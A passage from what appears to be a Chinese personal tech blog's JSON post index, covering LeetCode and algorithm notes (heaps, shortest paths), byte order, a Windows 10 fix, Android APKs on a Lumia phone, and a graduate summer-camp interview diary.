于是，我们计算邻居活细胞的个数，应该把状态2也计算进去。 根据状态做相应的修改，最后对2取模即可。 12345678910111213141516171819202122232425262728293031class Solution(object): def countLiveNeighbors(self, i, j, m, n, board): dx = [1, 1, 1, 0, 0, -1, -1, -1] dy = [1, 0, -1, 1, -1, 1, 0, -1] cnt = 0 for k in xrange(8): nx, ny = i + dx[k], j + dy[k] if nx &lt; 0 or ny &lt; 0 or nx &gt;= m or ny &gt;= n: continue if board[nx][ny] == 1 or board[nx][ny] == 2: cnt += 1 return cnt def gameOfLife(self, board): &quot;&quot;&quot; :type board: List[List[int]] :rtype: void Do not return anything, modify board in-place instead. &quot;&quot;&quot; m, n = len(board), len(board[0]) for i in xrange(m): for j in xrange(n): cnt = self.countLiveNeighbors(i, j, m, n, board) if board[i][j]: if not (cnt == 2 or cnt == 3): board[i][j] = 2 else: # temp[i][j] ==0 if cnt == 3: board[i][j] = 3 for i in xrange(m): for j in xrange(n): board[i][j] = board[i][j] &amp; 1 更多题解可以查看：https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"大端序和小端序","slug":"little-endian-and-big-endian","date":"2015-09-27T05:58:45.000Z","updated":"2021-01-08T13:42:14.065Z","comments":true,"path":"little-endian-and-big-endian/","link":"","permalink":"https://www.hrwhisper.me/little-endian-and-big-endian/","excerpt":"计算机中，有个概念是字节序。 字节序指的是计算机在存储多字节的时候，字节的存储数据。","text":"计算机中，有个概念是字节序。 字节序指的是计算机在存储多字节的时候，字节的存储数据。 大端序和小端序概念 首先介绍两个概念 MSB和LSB • MSB：最高有效位 • LSB ：最低有效位 比如，5A6C中， 5A就是MSB 6C为LSB 大端序中，最高有效位(MSB)位于最低的地址，在小端序则相反，最低有效位(LSB)位于最低的位置。 比如对于数0x12345678中，若地址为0x10~0x13，那么对于大端序 0x10: 12 0x11: 34 0x12: 56 0x13: 78 小端序为： 0x10: 78 0x11: 56 0x12: 34 0x13: 12 可以看出，大端序可读性很好，从地址低到高就是我们的数，可读性很好，而小端序完全相反了。 为什么要有小端序呢？这是因为计算机电路先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，计算机的内部处理都是小端字节序。 但是，大端序更符合人类的习惯。所以，除了计算机的内部处理，其他的场合几乎都是大端字节序，比如网络传输和文件储存。 判断大端序or小端序 那么，假如面试的时候，面试官让你编写一个C函数，来确定一个计算机的字节序是大端序还是小端序,我们该怎么办呢？ 我们知道，要看是大小端，我们只需要看最低的地址是高位还是低位，于是，我们可以用数字1，若是大端序，则最低地址应该为0，若为小端序，则最低地址应该为1。 那么对于一个int类型，如何才知道最低地址呢？ 用一个char的指针指向一个int即可。 12345bool isLittleEndian() &#123; int testNum = 1; char * p = (char *)&amp;testNum; return *p;&#125; 还可以用 union类型，union存放顺序是所有成员都从低地址开始存放。 12345678bool isLittleEndian() &#123; union &#123; int testNum; char singleByte; &#125; test; test.testNum = 1; return test.singleByte;&#125; 可以看出，我们的计算机一般是用小端序的，需要注意的是JAVA是大端序的。","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"计算机基础","slug":"study/计算机基础","permalink":"https://www.hrwhisper.me/categories/study/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"}]},{"title":"windows 10 出现 关键错误：开始菜单和cortana停止工作 解决办法","slug":"windows10-start-menu-and-cortana-stop-work-solution","date":"2015-09-01T10:19:08.000Z","updated":"2020-10-19T14:35:48.839Z","comments":true,"path":"windows10-start-menu-and-cortana-stop-work-solution/","link":"","permalink":"https://www.hrwhisper.me/windows10-start-menu-and-cortana-stop-work-solution/","excerpt":"今天遇到了一个win 10 的 BUG， 就是开机的时候出现 关键错误:开始菜单和Cortana停止工作。我们将尝试在你下一次登录后修复这一问题”的提示。 然而无论怎么重启都无效。 解决方法如下： 按ctrl + alt + del 打开任务管理器 点击服务标签 在下方点击 打开服务 在服务列表找到User Manager，右键属性，将启动类型改为自动 重启电脑即可","text":"今天遇到了一个win 10 的 BUG， 就是开机的时候出现 关键错误:开始菜单和Cortana停止工作。我们将尝试在你下一次登录后修复这一问题”的提示。 然而无论怎么重启都无效。 解决方法如下： 按ctrl + alt + del 打开任务管理器 点击服务标签 在下方点击 打开服务 在服务列表找到User Manager，右键属性，将启动类型改为自动 重启电脑即可 Solution: press ctrl + alt + del to open task manager. change to services tag, and open servies find User Manager，click right mouse button ,and click properties. change startup type to automatic,and click ok. restart your computer , everything will be ok. cortana-and-start-menu-stop-work-taskmanager","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"问题解决","slug":"others/问题解决","permalink":"https://www.hrwhisper.me/categories/others/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"}],"tags":[{"name":"windows10","slug":"windows10","permalink":"https://www.hrwhisper.me/tags/windows10/"}]},{"title":"Lumia 1020 (windows 10 mobile build 10512) 安装 APK 是怎样的一种体验","slug":"lumia-1020-windows-10-mobile-build-10512-install-android-apk","date":"2015-08-14T04:57:20.000Z","updated":"2020-10-20T14:43:15.426Z","comments":true,"path":"lumia-1020-windows-10-mobile-build-10512-install-android-apk/","link":"","permalink":"https://www.hrwhisper.me/lumia-1020-windows-10-mobile-build-10512-install-android-apk/","excerpt":"身为手握Lumia 1020的拍照神器，又身为windows insider会员，昨天升级10512，发现国行还是没有安卓子系统，怒刷港版，然后升级之~于是开始玩起APK。","text":"身为手握Lumia 1020的拍照神器，又身为windows insider会员，昨天升级10512，发现国行还是没有安卓子系统，怒刷港版，然后升级之~于是开始玩起APK。 一图流证明不是安卓： 手机已超过win10正式版版本（电脑为10.0.10240） 安装的方法很简单 wconnect.exe usb 用USB方法链接手机，手机需要开开发者模式 adb install XXX.apk PS:学过安卓开发的都懂，adb是啥玩意~ adb install win10 mobile 常用软件测试 QQ空间 wp上有二坑：支付宝和QQ空间 虽然我这两个都没怎么用~ QQ空间如下，完美运行，支付宝除了摄像头之外 其余暂未发现问题（这个太多人弄了，我就不搞了） wp_ss_20150814_0021 wp_ss_20150814_0021 wp_ss_20150814_0022 QQ HD QQ微信啥的有设备锁，不让你上，不过QQ HD和QQ轻聊版都可以~ QQHD如下（第一次使用需要进入好几次，之后都正常）： 其他的功能都OK，字太小了，感觉不爽，所以我觉得还是用WP的原版QQ吧。 可用可不用，等着QQ和微信的通用APP才是王道 PS：QQ轻聊版？咱还不如用原版的QQ呢~ 再PS：QQ hd横屏感觉叼叼的 wp_ss_20150814_0001 贴吧 其实wp的原版贴吧就可以用了=v= 我也不常刷，不过安卓版的明显UI啥的好看啊~推荐使用 PS:这货双击返回键回桌面是没用哒直接强关了吧 wp_ss_20150814_0003 网易新闻 同贴吧，wp版的也是可以用的，但安卓版UI好看，体验也比较好，推荐使用 wp_ss_20150814_0005 知乎 终于可以愉快的刷知乎了，终于可以摆脱第三方客户端了！不解释，强烈推荐~ wp_ss_20150814_0008 豆瓣 哇咔咔终于可以愉快的刷豆瓣了 虽然那个豆瓣pro不错，但是官方版的用起来总是比较爽的~ =v= 没发现啥问题，强烈推荐 wp_ss_20150814_0009 wp_ss_20150814_0011 Lofter 有的图片会出现加载失败的情况。 wp_ss_20150814_0002 微博 微博和知乎、豆瓣、lofter逼格比起来低了好多，wp上的马马虎虎都可以用了（说马马虎虎是因为没有夜间模式，虽然我都不怎么刷微博），这个安卓的图片的略缩图可能会加载失败，但是点进去又正常。视频可用。 总结，没有wp版的刷的爽，不推荐使用。等着通用APP吧 ] wp_ss_20150814_0015 QQ安全中心 当年玩游戏的时候。。wp没有。。。现在可以用了= =倒是没玩了。。。推荐使用 wp_ss_20150814_0015 京东 运行OK~ 可以抛弃原来的WP客户端了~ wp_ss_20150814_0024 淘宝HD 淘宝的直接安装会失败，但HD可以。体验比WP的好多了，推荐使用。 PS:搜索和淘宝HD文字重叠，但不影响使用（点那个搜索图标完全正常） 当然，要是你横屏显示那完美哒~ wp_ss_20150814_0018 下面是自己写的APP测试 SASA 这个我写的APK运行十分正常能在自己手机上跑太爽了！ wp_ss_20150814_0017 wp_ss_20150814_0016 人大助手 这个也是我写的也没啥问题~ wp_ss_20150814_0027 总结 windows 10 mobile迈出了重大的一步，可以说wp的应用缺乏的情况大幅改善，对windows生态具有重大的意义。 人家说兼容安卓会引起开发者流失，但更重要的是，如果没有用户，更不会有开发者。这个互联网的时代，用户反倒是最关键的，先解决最大的问题是应用的匮乏，才能吸引到足够的用户。有了足够的用户，开发者才会重视这个蛋糕。否则，我们骂支付婊，支付婊只是说推出通用应用，然而，还未知何时何日。 从build 10166到build 10512的安卓子环境从100+MB减少到了96MB，证明微软当前仍在对其进行调优。当前的APK安装主要问题是，摄像头开启有问题。博主个人认为这是安卓和wp的API不同造成的，如果对该环境修改，比如当使用安卓摄像头API自动跳转为wp的，我认为是可行的。就等着微软的动作了。 最后，期待过几个月吃掉IOS应用安装，还有通用应用（艺龙旅行通用应用掉渣天啊，飞一样的流畅）的崛起（QQ、微博、微信都有）。","categories":[{"name":"others","slug":"others","permalink":"https://www.hrwhisper.me/categories/others/"},{"name":"一些东东评测","slug":"others/一些东东评测","permalink":"https://www.hrwhisper.me/categories/others/%E4%B8%80%E4%BA%9B%E4%B8%9C%E4%B8%9C%E8%AF%84%E6%B5%8B/"}],"tags":[{"name":"windwos10 mobile","slug":"windwos10-mobile","permalink":"https://www.hrwhisper.me/tags/windwos10-mobile/"},{"name":"lumia","slug":"lumia","permalink":"https://www.hrwhisper.me/tags/lumia/"}]},{"title":"保研夏令营","slug":"postgraduate-recommendation-summer-campus","date":"2015-07-26T01:42:19.000Z","updated":"2021-01-08T13:42:14.077Z","comments":true,"path":"postgraduate-recommendation-summer-campus/","link":"","permalink":"https://www.hrwhisper.me/postgraduate-recommendation-summer-campus/","excerpt":"参加完RUC和ISCAS的夏令营......","text":"参加完RUC和ISCAS的夏令营...... RUC RUC夏令营是7月8~10号。我报的专硕（软工） 第一天很无聊的报道=v=拿了个饭卡和衣服继续去图书馆。。来报道的大概170个~ 第二天早上是各个实验室的宣讲。。。。 然后下午开始面试。 面试我排第8个吧， 进去4个老师，我认识两个。。我把我简历给老师一人一份发了。 然后最左边的男老师让我1分钟自我介绍，还强调中文= = 我：不然我用英文吧。。。 老师：就中文！ 我：= =（我没准备中文的自我介绍啊= =） 开始说自我介绍。。。 说我：最右边的老师问我：你做了个人大助手，你有账号？ 陈文萍老师：他当交流生。。。。。 最右边的老师：…… OK 第一个问题PASS了 陈文萍老师：你在RUC当交流生学了哪个让你印象最深刻的课？ 我：liangbin的程序设计安全。因为一个小小的地方却可能有些严重的漏洞啊，如格式字符串攻击啊，栈堆溢出啊。。。。 刘青老师：那你比较喜欢信安？ 我：我学的那些是选课比较自由。。。之前没接触过信安就学了点。。。弥补了空白。 刘青老师：你绩点那么高，为啥不报学硕？ 我：学硕主要是搞科研工作的，而我将来并不想做这个，想要去工作，而专硕偏向于实践。 刘青：那你目的很明确？ 我：是的。 最左边的男老师：你还报了啥夏令营。 我：ISCAS 最左边的男老师：我们给你过你回来么。。 我：（我肯定得说来啊） 来啊 why? 我：（机智的我早已想到会问这种了） 因为我对RUC比较熟悉 巴拉巴拉....（其实要不是看两年我才不报呢。。。当然不能这么说） 然后老师不问了，觉得挺满意= =都不问技术的。。 接着第一个女老师问英文问题： In you spare time you like running, do you join in some competitions？ 我没听清。。。。pardon。。。。 老师又说了一遍。。 我：no , I often run alone,and listen some music..... 老师：pardon 捂脸(/▽＼=) 之后我就出去了。。。 别人面试好久。。。我没几分钟就出来了。 他们本校的更快= = 这面试好水^ ^ 第三天是笔试和上机 笔试第一题 分别指出&amp;在 c/c++/java中的应用 c/c++ /java 逻辑与和按位与 c/c++中的取地址（当时竟然忘了写，亏我下面scanf写得那么开心） c++中的引用（觉得太水了一时happy当时也忘了写T^T） 给一个数组，求每个数除以第一个元素的值，并存在原位置 for循环嘛。。。注意从第二个元素开始算，最后第一个元素赋值为1 笔试第二题是求给定一个数n，求至少三个数，他们的LCM为n，且在所有解中和最小。如 54 可以变为1 2 27 这个和是最小的。 思路是分解素因子，相同因子的放一起，不够3个补1 笔试第三题是给定一个文档格式，要求你提取出来。字符域以\"开头，以\"结尾。，不同域以,分开。。两个\"\"表示一个引号字符。 好想用正则啊。。碰到,的时候，数引号的个数就好了昂。必须偶数次啊会是一个完整的域 这题我直接STL vector上了，题目说可以用任何你熟悉的系统函数~ 接着是机试，很水 就两题，第一题是一个数组中两个数的和等于第三个数（不同的三个数），问共有几个 我直接排序 枚举+二分O( n^2 logn) 然后去重，想要是TLE的话在哈希 结果1A了 出来听他们直接N^3竟然过了。。。我也是醉了。。 第二题是报时器 比如20：00你就说 twenty o'clock，规则题目都写好了。随便就过了。 提早交卷走人~ 除了英语感觉坑了外，其他都还好。 昨天老师说被录取了= = ISCAS 这个竟然从20~25。。。这么多天。。 20号报道好无聊。。换到了另一个师兄那去住他也是拿nokia ^ ^ 晚上开班会= =就是自我介绍下 21号开营仪式，就拍了个照片。然后是马校长的《感性的人与能动的实践》 下午两个报告，一个讲了网络安全（斯诺登啊）然后一个讲了人机（好无聊= =都讲别人的成果。。） 晚上组织去水立方、鸟巢，一半下大雨了。。这车上的味道我闻得还想吐啊。。。 22号是各个实验室介绍。。。 23号早上说是参观实验室，结果我们实验室直接分三组，轮流面试笔试机试，一上午都搞完了。。。后面就没啥事情了。 so 23下午在宿舍。。23晚上带厦大的cld去清华玩，顺便照了zbg学姐^ ^ 24号上午体检，然后下午宿舍睡觉，练练合唱的歌，把给我们的卡上的钱刷完（恰好一毛钱都不剩！哈哈哈） 25号闭营退宿舍，然后回RUC几天了~ 面试 前5分钟讲PPT，然后根据PPT提问。 部分问题如下： 他问我SVM啥是支持向量，项目中是调用别人的还是自己实现的（= =显然都是调用别人的啊） 然后说特征的优化？我说提取合理的特征是比后期优化的更为重要（其实没太明白老师问啥= =） 老师说认同我的观点，然后说要是很难提取出特征啥啥啥的。。。 其实我应该回答找最优的特征组合？ 不知道是不是这样，我就说不知道了= = 然后另外一个老师问我 要不要硕博连读，我说，不要（老师都喜欢读博的学生( ╯□╰ )） 要走学术还是工程的？ 我想也没想：工程的吧。。。 笔试 题目很杂，第一个是数字找规律的提，第二个是英语的计算题，第三个是逻辑题，第四个专业的知识，第五个简答，问了软件危机啊，什么是互联网+啊，一些名词解释如git / api 接着是英语翻译题（来不及写）最后是写一个你做的项目，从需求分析啥的，然后问有啥可以改进的，对软工有啥看法。 机试（也挺水，但是上机环境不忍直视，用的我最嫌弃最讨厌的VC6，人家JAVA的eclipse跑还会卡死） 一共10题，分为4类，要么前3类各选一题，要么直接做地4类也就是第10题 第一类 求三位数的所有水仙花数 求第n个素数（n&lt;20） 求Lcm(a,b） 我果断做了这个，代码量最少啊2333 第二类 一个数组中只有一个数频率超过了一半，求这个数(有线性的统计，然而题目的输入时1,2,1,3逗号间隔，懒得处理不做) BST合法性判断（我做了这个，出来后发现有BUG QAQ） 链表的选择排序（水~） 第三类 产生冠军 A赢B B赢C有冠军， A赢B B赢C C赢A 无冠军（找入度为0的点看是否有且仅有一个） 平面上n个点，求那个直线上点最多？ 0-1背包问题（选了这个水水的~） 第四类 判断身份证号合法性，如出生年份，闰年啥的 最后7月30号给了offer，学硕的","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"沙海拾贝","slug":"whisper/沙海拾贝","permalink":"https://www.hrwhisper.me/categories/whisper/%E6%B2%99%E6%B5%B7%E6%8B%BE%E8%B4%9D/"}],"tags":[{"name":"生活","slug":"生活","permalink":"https://www.hrwhisper.me/tags/%E7%94%9F%E6%B4%BB/"}]},{"title":"算法复习 - 堆 优先队列","slug":"algorithm-heap-priority-queue","date":"2015-07-08T09:14:52.000Z","updated":"2021-01-08T13:42:14.025Z","comments":true,"path":"algorithm-heap-priority-queue/","link":"","permalink":"https://www.hrwhisper.me/algorithm-heap-priority-queue/","excerpt":"本文是优先队列即二叉堆（heap）的整理，包括： push pop 堆的创建及其他应用","text":"本文是优先队列即二叉堆（heap）的整理，包括： push pop 堆的创建及其他应用 优先队列 在多任务环境中，操作系统必须决定在若干进程中运行哪个进程。我们知道，有一些任务应当具有优先权，对这些特殊的应用似乎需要一类特殊的队列，称之为优先队列(priority queue)。 优先队列至少应该实现insert和deleteMin操作。 一些简单的实现如下： 链表，插入队头O(1), 删除最小的元素则需要遍历链表O(n) 另一个方法是让链表保持在排序的状态，这使得插入代价O(n)，而deleteMin只需要O(1) BST：二叉查找树 对于两种操作平均时间都是O(logN)，但可能导致树的不平衡，用平衡树又显得过于麻烦 故优先队列使用二叉堆（binary heap）来实现。 二叉堆 如下图所示： binary-heap 对于数组中任意位置i上的元素，左儿子在2i上，右儿子在2*i+1上，而父亲在i/2上。 对于堆，其最小元总在根上，并且任意的子树也应该是堆。（即任意结点应该小于它的后裔） 堆的基本操作 1.insert 为了插入一个元素，我们在下一个空闲位置创建一个空穴，并对其与父结点进行比较，进行上滤操作。 如图，插入14，将14与父结点31比较，小于父结点，故把父结点放入下面的位置，14不断的上移直到找到正确的位置。 binary-heap-insert 实现的代码如下，显然其复杂度为O(logN) 123456789101112131415struct Heap&#123; int currentSize; vector&lt;int&gt; array; Heap() :currentSize(0), array(100)&#123;&#125; //初始化，array为100个元素的数组,currentSize = 0 void insert(const int x) &#123; if (currentSize == array.size() - 1) //需要当前的数组和开辟的数组的大小 array.resize(array.size() * 2); int hole = ++currentSize; for (; hole &gt; 1 &amp;&amp; x &lt; array[hole &gt;&gt; 1] ;hole &gt;&gt;= 1)//若当前的父亲比较大，则要继续往上,hole==1即为根结点 array[hole] = array[hole &gt;&gt; 1]; array[hole] = x; &#125;&#125;; 2.deleteMin 对于删除操作，把最后一个元素放在第一个位置，然后长度减一，相当于覆盖了原有的最小元素，然后对根结点进行下滤操作寻找合适的位置，来维护堆。如下图所示。 binary-heap-deleteMin 有一个陷阱是，将最后一个元素放在第一个位置后，原有的长度减少一，可能并没有右儿子结点。见上图的21.为此，我们需要进行判断。见下面的代码。 123456789101112131415161718192021void deleteMin()&#123; array[1] = array[currentSize--]; percolateDown(1);&#125;void percolateDown(int hole)&#123; int child; int x = array[hole]; while( (hole&lt;&lt;1) &lt;= currentSize) &#123; child = hole &lt;&lt; 1;//左儿子 if (child != currentSize &amp;&amp; array[child] &gt; array[child + 1])//若不等于currentSize，则一定有右儿子结点 child++; if (array[child] &gt;= x) break; //说明子结点已经都比x小，下滤完成 array[hole] = array[child]; hole = child; &#125; array[hole] = x;&#125; 可以看出，删除操作的复杂度也为O(logN) 堆的其它操作 至于返回最小的（返回根array[1])和堆是否为空return currentSize ==0 我就不说了 1.decreaseKey(p,x) 该操作将减少p处元素的值。减少的幅度为x(x&gt;0），这可能破坏堆的性质，因此需要进行上滤操作 2.increaseKey(p,x) 该操作将增加p处元素的值。增加的幅度为x(x&gt;0），因此用下滤操作 3.remove(p) 该操作删除堆中位置p上的结点。首先执行decreaseKey(p,∞)，然后在执行deleteMin来完成 4.bulidHeap 对于一个堆，我们可以通过N次连续的insert来完成，需要O(NlogN)操作来完成.下面要讲的是O(N)的建堆方法。 将N项以任意顺序放入树中，然后对每个有儿子结点的进行下滤操作来维护堆。可以证明，其总的复杂度为O(N) binary-heap-delete 1234567891011Heap(const vector&lt;int&gt; nums) :currentSize(nums.size()), array(nums.size()+10)&#123; for (int i = 0; i &lt; nums.size(); i++) array[i + 1] = nums[i]; //我们堆的下标从1开始的 buildHeap();&#125;void buildHeap()&#123; for (int i = currentSize &gt;&gt; 1; i &gt; 0; i--) percolateDown(i);&#125; 5.最大堆 最大堆和最小堆只需要改变一下比较的函数即可。最好用c++的重载运算符。 C++重载运算符比如,用这个比较的话的结果，即使用之前的代码即可实现最大堆。 1234567struct data&#123; int num; bool operator &lt; (const data&amp; x) const&#123; return num &gt; x.num; &#125;&#125;; 下面是Poj的一道题的堆的解法。我并没有用重载运算符，所以都需要改运算符的符号&lt;改大于啥的。 还有就是模仿STL的priority_queue，故insert和deleteMin操作对应的是push 和 pop 你可以自己实现一遍，加深理解。:) http://poj.org/problem?id=1862 题解在我的CSDN http://blog.csdn.net/murmured/article/details/25476967 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include&lt;cstdio&gt;#include&lt;cmath&gt;#include&lt;queue&gt;using namespace std;const int MAXN = 128;struct Heap&#123; int curSize; double data[MAXN]; Heap()&#123;curSize =0;&#125; void push(double x) &#123; int hole = ++curSize; for(;hole &gt; 1 &amp;&amp; data[hole&gt;&gt;1] &lt; x ;hole&gt;&gt;=1) data[hole] = data[hole&gt;&gt;1]; data[hole] = x; &#125; void pop() &#123; data[1] = data[curSize--]; matain(1); &#125; void matain(int hole) &#123; double x = data[hole]; for(int child;(hole&lt;&lt;1) &lt;= curSize;hole=child) &#123; child = hole &lt;&lt; 1; if(child!=curSize &amp;&amp; data[child] &lt; data[child+1]) child++; if( x &gt; data[child] ) break; data[hole]=data[child]; &#125; data[hole] = x; &#125; double top()&#123;return data[1];&#125; bool empty()&#123;return curSize == 0;&#125;&#125;;int main()&#123; int n; while(~scanf(&quot;%d&quot;,&amp;n)) &#123; Heap q; for(int i=0;i&lt;n;i++)&#123; int x; scanf(&quot;%d&quot;,&amp;x); q.push(x); &#125; while(!q.empty()) &#123; double x1 = q.top();q.pop(); if(q.empty())&#123; printf(&quot;%.3lf\\n&quot;,x1); break; &#125; double x2=q.top();q.pop(); q.push(sqrt(x2*x1)*2); &#125; &#125; return 0;&#125; 参考资料 《数据结构与算法分析 C++描述》","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"算法笔记","slug":"study/算法笔记","permalink":"https://www.hrwhisper.me/categories/study/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"C++","slug":"C","permalink":"https://www.hrwhisper.me/tags/C/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://www.hrwhisper.me/tags/Data-Structure/"},{"name":"heap","slug":"heap","permalink":"https://www.hrwhisper.me/tags/heap/"},{"name":"priority-queue","slug":"priority-queue","permalink":"https://www.hrwhisper.me/tags/priority-queue/"}]},{"title":"算法复习 - 图论 最短路和最小生成树","slug":"algorithm-graph-dijkstra-spfa-bellmanford-prim-kruskal","date":"2015-07-04T05:19:27.000Z","updated":"2020-10-19T14:35:48.723Z","comments":true,"path":"algorithm-graph-dijkstra-spfa-bellmanford-prim-kruskal/","link":"","permalink":"https://www.hrwhisper.me/algorithm-graph-dijkstra-spfa-bellmanford-prim-kruskal/","excerpt":"本文是博主对图论算法的复习做出的整理，包括如下内容 最短路径 dijkstra SPFA floyd 用SPFA解决差分约束 最小生成树MST prim kruskal 次小生成树 二分图 最大匹配和最小覆盖","text":"本文是博主对图论算法的复习做出的整理，包括如下内容 最短路径 dijkstra SPFA floyd 用SPFA解决差分约束 最小生成树MST prim kruskal 次小生成树 二分图 最大匹配和最小覆盖 最短路问题 无权最短路可以BFS解决，这里只讨论加权的。 一、dijkstra Dijkstra单源最短路算法，即计算从起点出发到每个点的最短路。Dijkstra常常作为其他算法的预处理。 使用邻接矩阵的时间复杂度为O(n^2) 用邻接表+优先队列（堆）的时间复杂度为O((m+n)logn)近似为O(mlogn) 1. 算法的思想和过程 每次选择一个未访问过的到已经访问过（标记为Known）的所有点的集合的最短边，并用这个点进行更新，过程如下： algorithm-dijkstra Dv为最短路，而Pv为前面的顶点。 1.初始 V Known Dv Pv V1 F 0 0 V2 F ∞ 0 V3 F ∞ 0 V4 F ∞ 0 V5 F ∞ 0 V6 F ∞ 0 V7 F ∞ 0 2.在v1被标记为已知后的表 V Known Dv Pv V1 T 0 0 V2 F 2 V1 V3 F ∞ 0 V4 F 1 V1 V5 F ∞ 0 V6 F ∞ 0 V7 F ∞ 0 3.下一步选取v4并且标记为known，顶点v3,v5,v6,v7是邻接的顶点，而他们实际上都需要调整。如表所示: V Known Dv Pv V1 T 0 0 V2 F 2 V1 V3 F 3 V4 V4 T 1 V1 V5 F 3 V4 V6 F 9 V4 V7 F 5 V4 4.接下来选取v2,v4是邻接点，但已经是known的，不需要调整，v5是邻接的点但不做调整，因为经过v2的值为2+10=12而长为3的路径已经是已知的。 V Known Dv Pv V1 T 0 0 V2 T 2 V1 V3 F 3 V4 V4 T 1 V1 V5 F 3 V4 V6 F 9 V4 V7 F 5 V4 5.接下来选取v5，值为3，v73+6&gt;5不需调整，然后选取v3，对v6的距离下调到3+5=8 V Known Dv Pv V1 T 0 0 V2 T 2 V1 V3 T 3 V4 V4 T 1 V1 V5 T 3 V4 V6 F 8 V3 V7 F 5 V4 6.再选下一个顶点是v7，v6变为5+1=6 V Known Dv Pv V1 T 0 0 V2 T 2 V1 V3 T 3 V4 V4 T 1 V1 V5 T 3 V4 V6 F 6 V7 V7 T 5 V4 7.最后选取v6 V Known Dv Pv V1 T 0 0 V2 T 2 V1 V3 T 3 V4 V4 T 1 V1 V5 T 3 V4 V6 T 6 V7 V7 T 5 V4 3. 局限性 Dijkstra没办法解决负边权的最短路径，如图 algorithm-dijkstra-disadvantage 运行完该算法后，从顶点1到顶点3的最短路径为1,3，其长度为1，而实际上最短路径为1,2,3，其长度为0.（因为过程中先选择v3，v3被标记为已知，今后不再更新） 4.算法实现 1．普通的邻接表 用vis作为上面标记的known，dis记录最短距离（记得初始化为一个很大的数）。 123456789101112131415161718192021void dijkstra(int s)&#123; memset(vis,0,sizeof(vis)); int cur=s; dis[cur]=0; vis[cur]=1; for(int i=0;i&lt;n;i++) &#123; for(int j=0;j&lt;n;j++) if(!vis[j] &amp;&amp; dis[cur] + map[cur][j] &lt; dis[j]) //未被标记且比已知的短，可更新 dis[j]=dis[cur] + map[cur][j] ; int mini=INF; for(int j=0;j&lt;n;j++) if(!vis[j] &amp;&amp; dis[j] &lt; mini) //选择下一次到已知顶点最短的点。 mini=dis[cur=j]; vis[cur]=true; &#125; &#125; 2.邻接表+优先队列。 要重载个比较函数. 123456789101112131415161718192021222324252627282930313233343536struct point&#123; int val,id; point(int id,int val):id(id),val(val)&#123;&#125; bool operator &lt;(const point &amp;x)const&#123; return val&gt;x.val; &#125;&#125;;void dijkstra(int s)&#123; memset(vis,0,sizeof(vis)); for(int i=0;i&lt;n;i++) dis[i]=INF; priority_queue&lt;point&gt; q; q.push(point(s,0)); dis[s]=0; while(!q.empty()) &#123; int cur=q.top().id; q.pop(); if(vis[cur]) continue; vis[cur]=true; for(int i=head[cur];i!=-1;i=e[i].next) &#123; int id=e[i].to; if(!vis[id] &amp;&amp; dis[cur]+e[i].val &lt; dis[id]) &#123; dis[id]=dis[cur]+e[i].val; q.push(point(id,dis[id])); &#125; &#125; &#125;&#125; 二、SPFA（bellman-ford） 1. 原理过程： bellman-ford算法的基本思想是，对图中除了源顶点s外的任意顶点u，依次构造从s到u的最短路径长度序列dist[u],dis2[u]……dis(n-1)[u]，其中n是图G的顶点数，dis1[u]是从s到u的只经过1条边的最短路径长度，dis2[u]是从s到u的最多经过G中2条边的最短路径长度……当图G中没有从源可达的负权图时，从s到u的最短路径上最多有n-1条边。 因此，dist(n-1)[u]就是从s到u的最短路径长度，显然，若从源s到u的边长为e(s,u)，则 dis1[u]=e(s,u)。 k&gt;1, dis(k)[u]满足递归式：dis(k)[u]=min{dis(k-1)[v]+e(v,u)} bellman-ford最短路径就是按照这个递归式计算最短路的。 SPFA是bellman-ford算法的队列实现版本（貌似也改进了点） SPFA的实现如下：用数组dis记录更新后的状态，cnt记录更新的次数，队列q记录更新过的顶点，算法依次从q中取出顶点v,按照dis(k)[u]=min{dis(k-1)[v]+e(v,u)}的递归式更新。在计算过程中，一旦发现顶点K有cnt[k]&gt;n，说明有一个从顶点K出发的负权圈，此时没有最短路，应终止算法。否则，队列为空的时候，算法得到G的各顶点的最短路径长度。 2.实现： 1234567891011121314151617181920212223242526272829303132void spfa(int s)&#123; memset(vis,0,sizeof(vis)); for(int i=0;i&lt;n;i++) dis[i]=INF; queue&lt;int&gt; q; q.push(s); vis[s]=true; dis[s]=0; while(!q.empty()) &#123; int cur=q.front(); q.pop(); vis[cur]=false; for(int i=head[cur];i!=-1;i=e[i].next) &#123; int id=e[i].to; if(dis[id] &gt; dis[cur]+e[i].val) &#123; dis[id] = dis[cur] + e[i].val; if(!vis[id]) &#123; vis[id]=true; q.push(id); &#125; &#125; &#125; &#125;&#125; 3. 优化 SLF（Small Label First）是指在入队时如果当前点的dist值小于队首， 则插入到队首， 否则插入到队尾。 LLL不太常用，我也没研究。 三、floyd 全称Floyd-Warshall。记得离散数学里面有Warshall算法，用来计算传递闭包。而数据结构每次都简称floyd，当时就觉得两个都差不多，有神马关系，后来google一下发现是同一个算法。。。。改个名字出来走江湖啊！！！！！ 这个算法用于求所有点对的最短距离。比调用n次dijkstra的优点在于代码简单。 时间复杂度为O(n^3) 1. 原理过程： 这是一个dp（动态规划的过程） dis[i][j]=min(dis[i][j],dis[i][k]+dis[k][j]); 即从顶点i到j且经过顶点k的最短路径长度。 2.实现： 1234567void floyd() &#123; for(int k=0;k&lt;n;k++) for(int i=0;i&lt;n;i++) for(int j=0;j&lt;n;j++) 